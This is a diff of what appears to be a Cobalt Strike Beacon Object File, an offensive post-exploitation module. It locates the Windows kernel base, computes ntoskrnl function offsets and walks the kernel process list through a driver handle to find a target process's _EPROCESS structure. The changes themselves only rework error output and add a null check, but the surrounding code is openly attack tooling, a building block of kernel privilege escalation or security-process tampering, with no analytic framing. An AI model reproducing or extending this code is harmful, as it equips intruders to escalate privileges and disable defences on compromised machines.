@@ -14,7 +14,7 @@ DWORD64 GetNtKernelVirtualAddresses(void)
     BOOL bResult = EnumDeviceDrivers(lpImageBase, cb, &lpcbNeeded);
     if (!bResult)
     {
-        BeaconPrintf(CALLBACK_OUTPUT, "Error when calling EnumDeviceDrivers: 0x%lx", GetLastError());
+        BeaconFormatPrintf(&outputbuffer, "Error when calling EnumDeviceDrivers: 0x%lx\n", GetLastError());
         return 0;
     }
 
@@ -31,6 +31,11 @@ DWORD64 GetNtKernelVirtualAddresses(void)
 DWORD64 GetFunctionOffsetFromNtoskrnl(char* FunctionName)
 {
     HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
+    if (Ntoskrnl == NULL)
+    {
+        BeaconFormatPrintf(&outputbuffer, "Failed to load ntoskrnl!\n");
+        return 0;
+    }
     DWORD64 GetFunctionOffset = (DWORD64)(GetProcAddress(Ntoskrnl, FunctionName)) - (DWORD64)Ntoskrnl;
 
     //printf("[+] %s offset from Ntoskrnl base: 0x%llx\n", FunctionName, GetFunctionOffset);
@@ -89,7 +94,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
         }
         if (FlinkPID == 4) // We looped back around to SYSTEM (Nt) pid
         {
-            BeaconPrintf(CALLBACK_ERROR ,"[!] Could not find _EPROCESS address for target process!");
+            BeaconFormatPrintf(&outputbuffer, "Could not find _EPROCESS address for target process!");
             break;
         }
 
@@ -113,7 +118,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
             }
             else
             {
-                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get _EPROCESS address of target process!");
+                BeaconFormatPrintf(&outputbuffer, "Failed to get _EPROCESS address of target process!");
                 return 0;
             }
         }
